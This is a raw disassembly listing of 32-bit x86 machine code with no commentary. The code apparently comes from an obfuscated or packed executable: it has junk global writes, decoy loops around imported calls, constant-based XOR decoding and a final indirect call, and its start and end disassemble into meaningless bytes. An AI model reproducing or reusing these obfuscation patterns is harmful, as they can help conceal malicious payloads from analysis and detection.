  40b076:	inc    ecx
  40b077:	push   es
  40b078:	pop    edx
  40b079:	mov    ebx,0xf4601afe
  40b07e:	adc    al,0xde
  40b080:	fsub   QWORD PTR [eax]
  40b082:	add    ah,BYTE PTR [edx-0x5c]
  40b085:	xor    eax,0xd751d692
  40b08a:	retf   
  40b08b:	fild   DWORD PTR [ebp+0x8]
  40b08e:	xor    bl,ah
  40b090:	jne    0x40b052
  40b092:	adc    DWORD PTR [edx-0x26],0x26
  40b096:	fidiv  DWORD PTR [ecx+0x1b]
  40b099:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b09a:	jmp    0xf7bb:0x2415f07c
  40b0a1:	xor    eax,0x1dc128f4
  40b0a6:	push   ebx
  40b0a7:	jb     0x40b0be
  40b0a9:	pop    es
  40b0aa:	fnsave [ebx-0x60186149]
  40b0b0:	push   cs
  40b0b1:	sbb    al,0x3a
  40b0b3:	jbe    0x40b0ce
  40b0b5:	mov    ecx,0x1fd63027
  40b0ba:	ror    BYTE PTR [eax-0x62e0820e],0x4e
  40b0c1:	adc    BYTE PTR [eax-0x5b],bl
  40b0c4:	enter  0xfc60,0xfd
  40b0c8:	mov    ds:0x413e4f56,al
  40b0cd:	test   DWORD PTR [edx+0x5920c9d9],edx
  40b0d3:	rcr    DWORD PTR [ebp-0x4d],cl
  40b0d6:	enter  0xa011,0x96
  40b0da:	mov    ds:0xb644aeeb,eax
  40b0df:	pop    ss
  40b0e0:	add    ecx,DWORD PTR [esi]
  40b0e2:	iret   
  40b0e3:	mov    ah,0x81
  40b0e5:	sbb    al,0xeb
  40b0e7:	ins    DWORD PTR es:[edi],dx
  40b0e8:	dec    edi
  40b0e9:	mov    bl,0x65
  40b0eb:	add    al,0xf4
  40b0ed:	jecxz  0x40b161
  40b0ef:	call   0x72b140d
  40b0f4:	ins    DWORD PTR es:[edi],dx
  40b0f5:	pop    esp
  40b0f6:	mov    esi,0x7d0eb67b
  40b0fb:	aad    0xdc
  40b0fd:	stos   DWORD PTR es:[edi],eax
  40b0fe:	push   0xffffffb4
  40b100:	lahf   
  40b101:	mov    al,0x10
  40b103:	or     al,0x1e
  40b105:	in     al,dx
  40b106:	add    edi,DWORD PTR [edx]
  40b108:	call   0x3948:0x43330d86
  40b10f:	add    eax,0xc88aff5b
  40b114:	pop    esi
  40b115:	scas   al,BYTE PTR es:[edi]
  40b116:	dec    eax
  40b117:	sbb    BYTE PTR [eax-0x12],cl
  40b11a:	rol    BYTE PTR [ebx],cl
  40b11c:	(bad)  
  40b11d:	lock shl BYTE PTR [eax+eax*8],1
  40b121:	xchg   edi,eax
  40b122:	int    0x4e
  40b124:	push   ds
  40b125:	outs   dx,DWORD PTR ds:[esi]
  40b126:	jne    0x40b133
  40b128:	stc    
  40b129:	mov    es,WORD PTR [ebx+0x3d]
  40b12c:	pop    edx
  40b12d:	sar    ah,cl
  40b12f:	loop   0x40b0d4
  40b131:	mov    cl,0x43
  40b133:	js     0x40b17c
  40b135:	cmp    ch,al
  40b137:	xor    al,0x93
  40b139:	sbb    al,0x1f
  40b13b:	repnz add al,0xaf
  40b13e:	in     eax,dx
  40b13f:	shr    dl,cl
  40b141:	pop    edx
  40b142:	fwait
  40b143:	aad    0xe7
  40b145:	adc    BYTE PTR [edx*1+0x82bce3],dh
  40b14c:	or     bl,bl
  40b14e:	ficom  WORD PTR [eax-0x700899a2]
  40b154:	(bad)  
  40b156:	cmp    DWORD PTR [ecx-0x27],esi
  40b159:	push   esi
  40b15a:	mov    esi,0x8979939f
  40b15f:	addps  xmm6,XMMWORD PTR [edi-0x5a]
  40b163:	int3   
  40b164:	in     al,dx
  40b165:	call   0xb9935fcb
  40b16a:	sub    BYTE PTR [ecx-0x14119665],ch
  40b170:	push   es
  40b171:	sbb    DWORD PTR [ebx+0x77],ebx
  40b174:	sub    DWORD PTR [ebx-0x60742aef],edi
  40b17a:	(bad)
  40b17d:	cmp    eax,0x19ba64b8
  40b182:	mov    ecx,0x308dd473
  40b187:	adc    eax,0xd4c01aaf
  40b18c:	pop    ss
  40b18d:	retf   0x5d41
  40b190:	fdivp  st(5),st
  40b192:	cmp    al,0x73
  40b194:	xchg   ebp,eax
  40b195:	jg     0x40b139
  40b197:	mov    eax,DWORD PTR [ebp+0x18]
  40b19a:	mov    esi,DWORD PTR [ebp+0x10]
  40b19d:	mov    DWORD PTR [esi+0xc],eax
  40b1a0:	mov    eax,DWORD PTR [ebp+0x1c]
  40b1a3:	mov    esi,DWORD PTR [ebp+0x10]
  40b1a6:	mov    DWORD PTR [esi+0x10],eax
  40b1a9:	mov    eax,DWORD PTR [ebp+0x8]
  40b1ac:	xor    eax,ecx
  40b1ae:	add    eax,edx
  40b1b0:	pop    esi
  40b1b1:	leave  
  40b1b2:	ret    0x18
  40b1b5:	push   ebp
  40b1b6:	mov    ebp,esp
  40b1b8:	mov    eax,ds:0x41d45c
  40b1bd:	sub    ecx,DWORD PTR ds:0x428010
  40b1c3:	mov    eax,DWORD PTR [eax+0x1c8]
  40b1c9:	mov    eax,DWORD PTR [eax]
  40b1cb:	sub    DWORD PTR ds:0x425004,0x167a
  40b1d5:	cdq    
  40b1d6:	sub    ecx,DWORD PTR ds:0x427000
  40b1dc:	push   ebx
  40b1dd:	add    ebx,0x2084
  40b1e3:	mov    ecx,0xfabdbef1
  40b1e8:	add    eax,ecx
  40b1ea:	inc    ebx
  40b1eb:	adc    edx,0xffffffff
  40b1ee:	push   esi
  40b1ef:	push   edi
  40b1f0:	mov    edi,edx
  40b1f2:	mov    DWORD PTR ds:0x428004,0x5236
  40b1fc:	mov    edx,DWORD PTR [ebp+0x8]
  40b1ff:	mov    ebx,eax
  40b201:	mov    eax,0x8a29a123
  40b206:	xor    esi,esi
  40b208:	xor    ebx,eax
  40b20a:	or     DWORD PTR ds:0x426004,0x425020
  40b214:	xor    edi,0x0
  40b217:	adc    DWORD PTR ds:0x427010,0x428004
  40b221:	add    edx,ecx
  40b223:	mov    DWORD PTR ds:0x425008,0x471a
  40b22d:	adc    esi,0xffffffff
  40b230:	xor    DWORD PTR ds:0x428010,0x421e
  40b23a:	xor    edx,eax
  40b23c:	xor    DWORD PTR ds:0x425018,0x5980
  40b246:	xor    esi,0x0
  40b249:	mov    DWORD PTR ds:0x426010,0x601d
  40b253:	cmp    edx,ebx
  40b255:	mov    DWORD PTR ds:0x425008,0x5a5b
  40b25f:	jne    0x40b281
  40b265:	mov    DWORD PTR ds:0x427008,0x3ec
  40b26f:	cmp    esi,edi
  40b271:	mov    DWORD PTR ds:0x425020,0x5f4c
  40b27b:	je     0x40b345
  40b281:	and    DWORD PTR ds:0x426000,0x0
  40b28b:	mov    edx,DWORD PTR ds:0x426000
  40b291:	inc    edx
  40b292:	mov    DWORD PTR ds:0x426000,edx
  40b298:	cmp    DWORD PTR ds:0x426000,0x5
  40b29f:	jne    0x40b2c5
  40b2a5:	push   0x41ff0e
  40b2aa:	push   0x5c4e
  40b2af:	push   DWORD PTR [ebp-0xc]
  40b2b2:	push   0x6b40
  40b2b7:	push   0x149b
  40b2bc:	push   DWORD PTR [ebp-0x10]
  40b2bf:	call   DWORD PTR ds:0x42104c
  40b2c5:	cmp    DWORD PTR ds:0x426000,0x4
  40b2cc:	jne    0x40b2e1
  40b2d2:	xor    edx,edx
  40b2d4:	xor    edx,DWORD PTR ds:0x426000
  40b2da:	inc    edx
  40b2db:	mov    DWORD PTR ds:0x426000,edx
  40b2e1:	cmp    DWORD PTR ds:0x426000,0x10
  40b2e8:	jb     0x40b28b
  40b2ee:	or     DWORD PTR ds:0x42600c,0x5f7e
  40b2f8:	mov    edx,DWORD PTR ds:0x41d45c
  40b2fe:	or     DWORD PTR ds:0x428000,0x427018
  40b308:	mov    edx,DWORD PTR [edx+0x1c0]
  40b30e:	mov    edx,DWORD PTR [edx]
  40b310:	or     DWORD PTR ds:0x425014,0x42801c
  40b31a:	xor    esi,esi
  40b31c:	adc    DWORD PTR ds:0x425010,0x7665
  40b326:	add    edx,ecx
  40b328:	adc    esi,0xffffffff
  40b32b:	xor    edx,eax
  40b32d:	xor    esi,0x0
  40b330:	cmp    edx,0x70941fd1
  40b336:	jne    0x40b3af
  40b33c:	cmp    esi,0xffffffff
  40b33f:	jne    0x40b3af
  40b345:	mov    edx,DWORD PTR ds:0x41d4e0
  40b34b:	mov    esi,DWORD PTR ds:0x41d4d8
  40b351:	xor    edx,esi
  40b353:	mov    DWORD PTR ds:0x41d4d8,edx
  40b359:	mov    edx,DWORD PTR [ebp+0xc]
  40b35c:	mov    edx,DWORD PTR [edx]
  40b35e:	mov    edx,DWORD PTR [edx]
  40b360:	mov    esi,DWORD PTR ds:0x41d4d8
  40b366:	add    DWORD PTR [edx],esi
  40b368:	mov    esi,DWORD PTR [ebp+0x8]
  40b36b:	mov    edx,DWORD PTR ds:0x41d4d8
  40b371:	xor    esi,0x7510893
  40b377:	add    esi,0x3272db
  40b37d:	xor    ebx,ebx
  40b37f:	add    esi,ecx
  40b381:	adc    ebx,0xffffffff
  40b384:	xor    edi,edi
  40b386:	xor    esi,eax
  40b388:	xor    ebx,0x0
  40b38b:	add    edx,ecx
  40b38d:	adc    edi,0xffffffff
  40b390:	xor    edx,eax
  40b392:	xor    edi,0x0
  40b395:	cmp    edx,esi
  40b397:	jne    0x40b3af
  40b39d:	cmp    edi,ebx
  40b39f:	jne    0x40b3af
  40b3a5:	mov    eax,ds:0x41d4d8
  40b3aa:	mov    ds:0x41d4e0,eax
  40b3af:	pop    edi
  40b3b0:	pop    esi
  40b3b1:	pop    ebx
  40b3b2:	pop    ebp
  40b3b3:	ret    0x8
  40b3b6:	push   ebp
  40b3b7:	mov    ebp,esp
  40b3b9:	sub    esp,0x90
  40b3bf:	and    DWORD PTR ds:0x428004,0x0
  40b3c9:	jmp    0x40b3db
  40b3ce:	mov    ecx,DWORD PTR ds:0x428004
  40b3d4:	inc    ecx
  40b3d5:	mov    DWORD PTR ds:0x428004,ecx
  40b3db:	cmp    DWORD PTR ds:0x428004,0x14
  40b3e2:	jae    0x40b417
  40b3e8:	cmp    DWORD PTR ds:0x428004,0x20
  40b3ef:	jne    0x40b405
  40b3f5:	push   0x41ff61
  40b3fa:	push   0x41ff4b
  40b3ff:	call   DWORD PTR ds:0x421050
  40b405:	jmp    0x40b3ce
  40b40a:	movzx  ecx,BYTE PTR ds:0x42801c
  40b411:	sub    DWORD PTR ds:0x425014,ecx
  40b417:	push   esi
  40b418:	or     ecx,eax
  40b41a:	push   edi
  40b41b:	and    DWORD PTR ds:0x428004,0x0
  40b425:	jmp    0x40b435
  40b42a:	mov    eax,ds:0x428004
  40b42f:	inc    eax
  40b430:	mov    ds:0x428004,eax
  40b435:	cmp    DWORD PTR ds:0x428004,0x10
  40b43c:	jae    0x40b460
  40b442:	cmp    DWORD PTR ds:0x428004,0x1f
  40b449:	jne    0x40b45b
  40b44f:	push   DWORD PTR [ebp-0x20]
  40b452:	push   DWORD PTR [ebp-0x14]
  40b455:	call   DWORD PTR ds:0x421054
  40b45b:	jmp    0x40b42a
  40b460:	mov    eax,ds:0x41d45c
  40b465:	and    ecx,0x5378
  40b46b:	mov    DWORD PTR [ebp-0x2c],eax
  40b46e:	sub    esi,DWORD PTR ds:0x425018
  40b474:	mov    eax,ds:0x41d568
  40b479:	mov    DWORD PTR [ebp-0x3c],eax
  40b47c:	and    DWORD PTR [ebp-0x34],0x0
  40b480:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  40b487:	add    DWORD PTR ds:0x42600c,0x3783
  40b491:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  40b498:	and    DWORD PTR ds:0x42901c,0x4e39
  40b4a2:	mov    eax,DWORD PTR [ebp-0x1c]
  40b4a5:	xor    DWORD PTR ds:0x42800c,0x4866
  40b4af:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b4b2:	sub    esi,DWORD PTR ds:0x427008
  40b4b8:	xor    eax,ecx
  40b4ba:	mov    ecx,DWORD PTR ds:0x41d27c
  40b4c0:	mov    esi,DWORD PTR ds:0x41d298
  40b4c6:	sub    ecx,esi
  40b4c8:	sub    ecx,DWORD PTR [ecx+esi*1]
  40b4cb:	mov    DWORD PTR [ebp-0x1c],eax
  40b4ce:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  40b4d5:	add    DWORD PTR ds:0x426008,ecx
  40b4db:	mov    eax,DWORD PTR [ebp-0x28]
  40b4de:	xor    DWORD PTR ds:0x428018,ebx
  40b4e4:	mov    ecx,DWORD PTR [ebp-0x28]
  40b4e7:	or     esi,edi
  40b4e9:	xor    eax,ecx
  40b4eb:	mov    DWORD PTR [ebp-0x28],eax
  40b4ee:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  40b4f5:	sub    ecx,0x68bb
  40b4fb:	mov    eax,DWORD PTR [ebp-0x18]
  40b4fe:	mov    ecx,DWORD PTR [ebp-0x18]
  40b501:	xor    eax,ecx
  40b503:	adc    ecx,esi
  40b505:	mov    DWORD PTR [ebp-0x18],eax
  40b508:	not    DWORD PTR ds:0x428008
  40b50e:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  40b515:	mov    ecx,DWORD PTR ds:0x41ffef
  40b51b:	mov    esi,DWORD PTR ds:0x41d294
  40b521:	sub    esi,ecx
  40b523:	and    ecx,DWORD PTR [ecx+esi*1]
  40b526:	mov    eax,DWORD PTR [ebp-0x24]
  40b529:	mov    ecx,DWORD PTR [ebp-0x24]
  40b52c:	xor    eax,ecx
  40b52e:	and    edi,0x1f5e
  40b534:	mov    DWORD PTR [ebp-0x24],eax
  40b537:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  40b53e:	mov    eax,DWORD PTR [ebp-0x14]
  40b541:	mov    ecx,DWORD PTR [ebp-0x14]
  40b544:	xor    eax,ecx
  40b546:	and    DWORD PTR ds:0x428018,0x1b89
  40b550:	mov    DWORD PTR [ebp-0x14],eax
  40b553:	mov    edi,DWORD PTR ds:0x41ffd7
  40b559:	mov    ecx,DWORD PTR ds:0x41d260
  40b55f:	sub    edi,ecx
  40b561:	xor    edi,DWORD PTR [edi+ecx*1]
  40b564:	mov    eax,DWORD PTR [ebp-0x20]
  40b567:	mov    DWORD PTR ds:0x427010,0x1f
  40b571:	cmp    DWORD PTR ds:0x427010,0x0
  40b578:	je     0x40b5ad
  40b57e:	cmp    DWORD PTR ds:0x427010,0x2f
  40b585:	jne    0x40b59b
  40b58b:	push   0x425000
  40b590:	push   0x673f
  40b595:	call   DWORD PTR ds:0x421058
  40b59b:	mov    edi,DWORD PTR ds:0x427010
  40b5a1:	dec    edi
  40b5a2:	mov    DWORD PTR ds:0x427010,edi
  40b5a8:	jmp    0x40b571
  40b5ad:	mov    ecx,DWORD PTR [ebp-0x14]
  40b5b0:	mov    esi,0x7510893
  40b5b5:	neg    DWORD PTR ds:0x42900c
  40b5bb:	xor    eax,esi
  40b5bd:	mov    edi,0x3272db
  40b5c2:	add    eax,edi
  40b5c4:	xor    eax,ecx
  40b5c6:	mov    DWORD PTR [ebp-0x14],eax
  40b5c9:	sbb    DWORD PTR ds:0x426010,0x1ce0
  40b5d3:	mov    eax,DWORD PTR [ebp-0x10]
  40b5d6:	xor    ecx,DWORD PTR ds:0x42800c
  40b5dc:	mov    ecx,DWORD PTR [ebp-0x10]
  40b5df:	sub    eax,ecx
  40b5e1:	and    ecx,DWORD PTR ds:0x427018
  40b5e7:	mov    DWORD PTR [ebp-0x10],eax
  40b5ea:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  40b5f1:	xor    ecx,DWORD PTR ds:0x42500c
  40b5f7:	mov    al,BYTE PTR [ebp-0x1]
  40b5fa:	add    DWORD PTR ds:0x425018,ecx
  40b600:	movzx  ecx,BYTE PTR [ebp-0x1]
  40b604:	movzx  eax,al
  40b607:	adc    DWORD PTR ds:0x42700c,0x429008
  40b611:	sub    ecx,eax
  40b613:	mov    BYTE PTR [ebp-0x1],cl
  40b616:	movzx  eax,BYTE PTR [ebp-0x1]
  40b61a:	xor    eax,0xffffff99
  40b61d:	mov    BYTE PTR [ebp-0x1],al
  40b620:	or     eax,DWORD PTR ds:0x42901c
  40b626:	mov    eax,DWORD PTR [ebp-0x20]
  40b629:	xor    eax,esi
  40b62b:	add    eax,edi
  40b62d:	and    DWORD PTR ds:0x429004,0xdaf
  40b637:	mov    DWORD PTR [ebp-0x14],eax
  40b63a:	and    DWORD PTR ds:0x428018,0x429014
  40b644:	lea    eax,[ebp-0x40]
  40b647:	adc    DWORD PTR ds:0x425024,0x42500c
  40b651:	mov    DWORD PTR [ebp-0x38],eax
  40b654:	adc    DWORD PTR ds:0x425020,0x75b6
  40b65e:	lea    eax,[ebp-0x38]
  40b661:	mov    DWORD PTR [ebp-0x44],eax
  40b664:	sbb    DWORD PTR ds:0x425010,0x425028
  40b66e:	lea    eax,[ebp-0x44]
  40b671:	mov    DWORD PTR [ebp-0x8],eax
  40b674:	or     DWORD PTR ds:0x427008,0x2eb5
  40b67e:	lea    eax,[ebp-0x8]
  40b681:	and    DWORD PTR ds:0x42801c,0x428004
  40b68b:	mov    DWORD PTR [ebp-0x48],eax
  40b68e:	adc    DWORD PTR ds:0x42700c,ebx
  40b694:	mov    eax,DWORD PTR [ebp-0x18]
  40b697:	sbb    DWORD PTR ds:0x425010,0x426010
  40b6a1:	xor    eax,esi
  40b6a3:	add    eax,edi
  40b6a5:	and    DWORD PTR ds:0x429014,0x19f0
  40b6af:	push   eax
  40b6b0:	mov    eax,DWORD PTR [ebp-0x1c]
  40b6b3:	xor    eax,esi
  40b6b5:	add    eax,edi
  40b6b7:	push   eax
  40b6b8:	mov    eax,DWORD PTR [ebp-0x10]
  40b6bb:	xor    eax,esi
  40b6bd:	add    eax,edi
  40b6bf:	push   eax
  40b6c0:	lea    eax,[ebp-0x90]
  40b6c6:	push   eax
  40b6c7:	push   DWORD PTR [ebp-0x20]
  40b6ca:	push   DWORD PTR [ebp-0x30]
  40b6cd:	call   0x408d97
  40b6d2:	test   eax,eax
  40b6d4:	je     0x40b705
  40b6da:	lea    eax,[ebp-0x90]
  40b6e0:	push   eax
  40b6e1:	mov    eax,DWORD PTR [ebp-0x30]
  40b6e4:	xor    eax,esi
  40b6e6:	add    eax,edi
  40b6e8:	push   eax
  40b6e9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b6ec:	add    eax,0xaa
  40b6f1:	push   eax
  40b6f2:	mov    eax,DWORD PTR [ebp-0x2c]
  40b6f5:	mov    eax,DWORD PTR [eax+0x198]
  40b6fb:	push   DWORD PTR [eax]
  40b6fd:	call   0x403f26
  40b702:	mov    DWORD PTR [ebp-0x40],eax
  40b705:	lea    eax,[ebp+0x4]
  40b708:	mov    DWORD PTR [ebp-0x34],eax
  40b70b:	mov    eax,DWORD PTR [ebp-0x8]
  40b70e:	mov    eax,DWORD PTR [eax]
  40b710:	mov    eax,DWORD PTR [eax]
  40b712:	mov    eax,DWORD PTR [eax]
  40b714:	test   eax,eax
  40b716:	je     0x40b797
  40b71c:	lea    eax,[ebp-0xc]
  40b71f:	mov    DWORD PTR [ebp-0x4c],eax
  40b722:	mov    eax,DWORD PTR [ebp-0x3c]
  40b725:	mov    DWORD PTR [ebp-0xc],eax
  40b728:	mov    eax,DWORD PTR [ebp-0x8]
  40b72b:	mov    eax,DWORD PTR [eax]
  40b72d:	mov    eax,DWORD PTR [eax]
  40b72f:	mov    eax,DWORD PTR [eax]
  40b731:	sub    DWORD PTR [ebp-0xc],eax
  40b734:	mov    ecx,DWORD PTR [ebp-0x10]
  40b737:	xor    ecx,esi
  40b739:	mov    eax,0xffcd8d25
  40b73e:	sub    eax,ecx
  40b740:	add    DWORD PTR [ebp-0xc],eax
  40b743:	mov    eax,DWORD PTR [ebp-0xc]
  40b746:	mov    ecx,DWORD PTR [ebp-0x8]
  40b749:	mov    ecx,DWORD PTR [ecx]
  40b74b:	mov    ecx,DWORD PTR [ecx]
  40b74d:	mov    ecx,DWORD PTR [ecx]
  40b74f:	mov    DWORD PTR [ecx+0x1],eax
  40b752:	mov    al,BYTE PTR [ebp-0x1]
  40b755:	mov    ecx,DWORD PTR [ebp-0x8]
  40b758:	mov    ecx,DWORD PTR [ecx]
  40b75a:	mov    ecx,DWORD PTR [ecx]
  40b75c:	mov    ecx,DWORD PTR [ecx]
  40b75e:	push   DWORD PTR [ebp-0x2c]
  40b761:	xor    al,0x6f
  40b763:	sub    al,0xd
  40b765:	mov    BYTE PTR [ecx],al
  40b767:	mov    eax,ds:0x41d2d8
  40b76c:	push   DWORD PTR [eax]
  40b76e:	push   DWORD PTR ds:0x41d534
  40b774:	push   DWORD PTR ds:0x41d2e0
  40b77a:	push   DWORD PTR ds:0x41d514
  40b780:	push   DWORD PTR ds:0x41d588
  40b786:	push   DWORD PTR [ebp-0x30]
  40b789:	push   DWORD PTR [ebp-0x20]
  40b78c:	mov    eax,DWORD PTR [ebp-0x8]
  40b78f:	mov    eax,DWORD PTR [eax]
  40b791:	mov    eax,DWORD PTR [eax]
  40b793:	mov    eax,DWORD PTR [eax]
  40b795:	call   eax
  40b797:	mov    eax,DWORD PTR [ebp-0x34]
  40b79a:	mov    ecx,DWORD PTR ds:0x41d4d8
  40b7a0:	add    DWORD PTR [eax],ecx
  40b7a2:	pop    edi
  40b7a3:	pop    esi
  40b7a4:	leave  
  40b7a5:	ret    
  40b7a6:	push   ebp
  40b7a7:	mov    ebp,esp
  40b7a9:	sub    esp,0x18
  40b7ac:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  40b7b3:	lea    eax,[ebp+0x14]
  40b7b6:	neg    edx
  40b7b8:	mov    DWORD PTR [ebp-0x4],eax
  40b7bb:	push   esi
  40b7bc:	sbb    DWORD PTR ds:0x426000,edi
  40b7c2:	mov    esi,0xf89c85b6
  40b7c7:	mov    DWORD PTR [ebp-0xc],esi
  40b7ca:	lea    eax,[ebp-0xc]
  40b7cd:	add    edx,ecx
  40b7cf:	mov    DWORD PTR [ebp-0x14],eax
  40b7d2:	sub    edx,ecx
  40b7d4:	mov    eax,DWORD PTR [ebp-0xc]
  40b7d7:	dec    ecx
  40b7d8:	mov    edx,DWORD PTR [ebp-0x14]
  40b7db:	and    ecx,0x3a88
  40b7e1:	mov    ecx,0x7510893
  40b7e6:	or     DWORD PTR ds:0x427010,0x426000
  40b7f0:	xor    eax,ecx
  40b7f2:	add    eax,0x3272db
  40b7f7:	sub    DWORD PTR ds:0x427010,0x427014
  40b801:	mov    DWORD PTR [edx],eax
  40b803:	xor    DWORD PTR ds:0x425000,0x422
  40b80d:	mov    eax,ds:0x41d2d4
  40b812:	mov    edx,DWORD PTR ds:0x41d260
  40b818:	mov    edx,DWORD PTR [edx]
  40b81a:	xor    DWORD PTR ds:0x426000,edx
  40b820:	mov    edx,DWORD PTR [ebp-0x4]
  40b823:	mov    eax,DWORD PTR [eax]
  40b825:	and    DWORD PTR ds:0x425008,0x4c84
  40b82f:	add    eax,DWORD PTR [edx]
  40b831:	mov    DWORD PTR ds:0x426004,0x10
  40b83b:	cmp    DWORD PTR ds:0x426004,0x0
  40b842:	je     0x40b874
  40b848:	cmp    DWORD PTR ds:0x426004,0x20
  40b84f:	jne    0x40b860
  40b855:	push   0x6cf7
  40b85a:	call   DWORD PTR ds:0x421014
  40b860:	xor    edx,edx
  40b862:	add    edx,DWORD PTR ds:0x426004
  40b868:	dec    edx
  40b869:	mov    DWORD PTR ds:0x426004,edx
  40b86f:	jmp    0x40b83b
  40b874:	push   edi
  40b875:	mov    DWORD PTR [ebp-0x8],eax
  40b878:	sub    edi,0x3a07
  40b87e:	mov    edi,DWORD PTR [ebp+0x8]
  40b881:	mov    DWORD PTR ds:0x429004,0x1a
  40b88b:	cmp    DWORD PTR ds:0x429004,0x0
  40b892:	je     0x40b8ca
  40b898:	cmp    DWORD PTR ds:0x429004,0x2a
  40b89f:	jne    0x40b8b8
  40b8a5:	push   0x42901c
  40b8aa:	push   0x429000
  40b8af:	push   DWORD PTR [ebp-0xc]
  40b8b2:	call   DWORD PTR ds:0x42105c
  40b8b8:	mov    edx,DWORD PTR ds:0x429004
  40b8be:	dec    edx
  40b8bf:	mov    DWORD PTR ds:0x429004,edx
  40b8c5:	jmp    0x40b88b
  40b8ca:	mov    eax,ds:0x41d45c
  40b8cf:	add    DWORD PTR ds:0x426018,0x7a9e
  40b8d9:	mov    eax,DWORD PTR [eax+0x198]
  40b8df:	and    DWORD PTR ds:0x428000,0x0
  40b8e9:	jmp    0x40b8fb
  40b8ee:	mov    edx,DWORD PTR ds:0x428000
  40b8f4:	inc    edx
  40b8f5:	mov    DWORD PTR ds:0x428000,edx
  40b8fb:	cmp    DWORD PTR ds:0x428000,0x16
  40b902:	jae    0x40b949
  40b908:	cmp    DWORD PTR ds:0x428000,0xa
  40b90f:	jne    0x40b920
  40b915:	push   0x6e10
  40b91a:	call   DWORD PTR ds:0x421018
  40b920:	cmp    DWORD PTR ds:0x428000,0x9
  40b927:	jne    0x40b93a
  40b92d:	mov    edx,DWORD PTR ds:0x428000
  40b933:	inc    edx
  40b934:	mov    DWORD PTR ds:0x428000,edx
  40b93a:	jmp    0x40b8ee
  40b93f:	adc    DWORD PTR ds:0x42800c,0x7489
  40b949:	xor    edi,ecx
  40b94b:	mov    edx,DWORD PTR ds:0x41d2ac
  40b951:	mov    edx,DWORD PTR [edx]
  40b953:	and    DWORD PTR ds:0x426010,edx
  40b959:	mov    edx,0x3272db
  40b95e:	add    edi,edx
  40b960:	mov    DWORD PTR ds:0x427014,0x73af
  40b96a:	cmp    DWORD PTR [eax],edi
  40b96c:	je     0x40b98d
  40b972:	mov    DWORD PTR ds:0x427018,0x6eb3
  40b97c:	mov    eax,DWORD PTR [eax]
  40b97e:	mov    DWORD PTR ds:0x429008,0x1439
  40b988:	jmp    0x410469
  40b98d:	mov    eax,0x67c2
  40b992:	mov    eax,DWORD PTR [ebp+0x18]
  40b995:	cmp    eax,esi
  40b997:	jne    0x40b9b1
  40b99d:	mov    DWORD PTR ds:0x427004,0x29bc
  40b9a7:	push   0xf89c85b5
  40b9ac:	jmp    0x410458
  40b9b1:	mov    esi,DWORD PTR [ebp+0x18]
  40b9b4:	not    DWORD PTR ds:0x42700c
  40b9ba:	mov    eax,0xf89c85b4
  40b9bf:	mov    DWORD PTR ds:0x427008,0x585a
  40b9c9:	cmp    esi,eax
  40b9cb:	mov    DWORD PTR ds:0x429004,0x6551
  40b9d5:	jne    0x410448
  40b9db:	or     eax,eax
  40b9dd:	mov    eax,DWORD PTR [ebp+0x10]
  40b9e0:	add    DWORD PTR ds:0x425020,edi
  40b9e6:	xor    eax,ecx
  40b9e8:	add    DWORD PTR ds:0x425020,0xdeb
  40b9f2:	add    eax,edx
  40b9f4:	mov    DWORD PTR ds:0x425004,0x1b
  40b9fe:	cmp    DWORD PTR ds:0x425004,0x0
  40ba05:	je     0x40ba5e
  40ba0b:	cmp    DWORD PTR ds:0x425004,0x2
  40ba12:	jne    0x40ba30
  40ba18:	push   0x7389
  40ba1d:	push   0x7d80
  40ba22:	push   DWORD PTR [ebp-0xc]
  40ba25:	push   0x7694
  40ba2a:	call   DWORD PTR ds:0x42101c
  40ba30:	cmp    DWORD PTR ds:0x425004,0x3
  40ba37:	jne    0x40ba4a
  40ba3d:	mov    esi,DWORD PTR ds:0x425004
  40ba43:	dec    esi
  40ba44:	mov    DWORD PTR ds:0x425004,esi
  40ba4a:	xor    esi,esi
  40ba4c:	add    esi,DWORD PTR ds:0x425004
  40ba52:	dec    esi
  40ba53:	mov    DWORD PTR ds:0x425004,esi
  40ba59:	jmp    0x40b9fe
  40ba5e:	mov    DWORD PTR [ebp-0x18],eax
  40ba61:	adc    eax,DWORD PTR ds:0x42801c
  40ba67:	mov    eax,DWORD PTR [ebp+0xc]
  40ba6a:	mov    esi,DWORD PTR [ebp-0x8]
  40ba6d:	or     DWORD PTR ds:0x42501c,0x426004
  40ba77:	xor    eax,ecx
  40ba79:	add    eax,edx
  40ba7b:	xor    DWORD PTR ds:0x429004,0x42601c
  40ba85:	imul   eax,DWORD PTR [esi]
  40ba88:	mov    esi,DWORD PTR [ebp+0x8]
  40ba8b:	sbb    DWORD PTR ds:0x427014,0x428018
  40ba95:	xor    esi,ecx
  40ba97:	add    DWORD PTR ds:0x429014,0x42500c
  40baa1:	add    esi,edx
  40baa3:	cmp    esi,eax
  40baa5:	jmp    0x40de50
  40baaa:	jl     0x40baa1
  40baac:	retf   0xc78f
  40baaf:	mov    esi,DWORD PTR [ebx]
  40bab1:	test   edi,edi
  40bab3:	rcl    ch,cl
  40bab5:	jmp    0xf573:0xb0eb4492
  40babc:	bound  esp,QWORD PTR [edx-0xc]
  40babf:	pop    edi
  40bac0:	bound  esp,QWORD PTR [edx+0x68]
  40bac3:	jo     0x40bb17
  40bac5:	mov    DWORD PTR [edx+0x69],esp
  40bac8:	or     BYTE PTR [edi+0x4b],0xc0
  40bacc:	das    
  40bacd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bace:	inc    eax
  40bacf:	xor    eax,0x4d41a6c
  40bad4:	or     esi,edi
  40bad6:	ds push esp
  40bad8:	xchg   esi,eax
  40bad9:	dec    ebx
  40bada:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40badb:	sub    al,0x52
  40badd:	shl    DWORD PTR [edi],0x69
  40bae0:	stos   BYTE PTR es:[edi],al
  40bae1:	jns    0x40bb35
  40bae3:	sub    al,0x38
  40bae5:	adc    edx,eax
  40bae7:	mov    ah,0xc3
  40bae9:	mov    ah,0x5a
  40baeb:	scas   eax,DWORD PTR es:[edi]
  40baec:	cmp    eax,DWORD PTR [edi-0x4e7145ce]
